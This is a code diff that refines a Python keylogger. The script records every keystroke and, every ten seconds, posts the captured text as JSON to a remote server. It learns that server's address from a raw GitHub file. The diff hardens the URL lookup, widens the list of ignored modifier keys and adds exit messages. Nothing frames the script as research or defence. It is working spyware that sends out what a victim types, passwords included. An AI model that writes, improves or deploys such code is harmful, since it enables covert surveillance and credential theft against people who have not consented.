@@ -9,11 +9,21 @@ text = ""
 # Time interval (in seconds) to send data to the server
 time_interval = 10
 
-# Server URL - replace with your actual server address
-server_url = requests.get("https://raw.githubusercontent.com/0xc18/python-keylogger/refs/heads/main/host").text
+# Get server URL safely
+try:
+    server_url = requests.get("https://raw.githubusercontent.com/0xc18/python-keylogger/refs/heads/main/host").text.strip()
+    if not server_url.startswith("http"):
+        raise ValueError("Invalid server URL received.")
+except Exception as e:
+    print(f"Failed to retrieve server URL: {e}")
+    server_url = None
 
 def send_post_req():
     global text
+    if not server_url:
+        print("Server URL is not set. Skipping data send.")
+        return
+
     if text.strip():  # Only send if there's data
         try:
             payload = json.dumps({"KeyboardData": text})
@@ -23,7 +33,6 @@ def send_post_req():
         except Exception as e:
             print(f"Error sending request: {e}")
         finally:
-            # Clear text after sending
             text = ""
     # Schedule the next call
     timer = threading.Timer(time_interval, send_post_req)
@@ -41,19 +50,22 @@ def on_press(key):
             text += ' '
         elif key == keyboard.Key.backspace:
             text = text[:-1]
-        elif key in (keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
-            pass  # Do nothing for modifier keys
+        elif key in (keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt, keyboard.Key.alt_gr):
+            pass  # Ignore modifier keys
         elif key == keyboard.Key.esc:
+            print("Escape key pressed. Exiting.")
             return False  # Stop the listener
         else:
-            text += str(key.char)
+            text += key.char
     except AttributeError:
         # Handle special keys that don't have a char attribute
-        text += f'[{key.name}]'
+        text += f'[{key}]'
 
 if __name__ == "__main__":
-    # Start the periodic sender
-    send_post_req()
-    # Start listening for key presses
+    if server_url:
+        send_post_req()
+    else:
+        print("Server URL not set. Keylogger will run but won't send data.")
+
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
